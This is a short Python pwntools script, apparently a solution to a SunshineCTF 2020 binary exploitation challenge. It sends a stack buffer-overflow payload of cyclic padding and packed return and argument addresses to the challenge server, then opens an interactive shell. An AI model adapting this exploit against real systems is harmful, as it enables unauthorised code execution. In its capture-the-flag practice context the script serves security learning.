import pwn

pwn.context.arch = 'amd64'

sh = pwn.remote('chal.2020.sunshinectf.org', 30002)
# sh = pwn.process('./chall_02')

p1 = "A" * 13

padding = 62
payload = pwn.cyclic(padding) + pwn.p32(0x08048390) + pwn.p32(0x0) + pwn.p32(0x8049610)

with open('payload', 'w') as f:
    f.write(p1 + '\n')

with open('payload', 'ab') as f:
    f.write(payload)

sh.sendline(p1)
sh.sendline(payload)
sh.interactive()
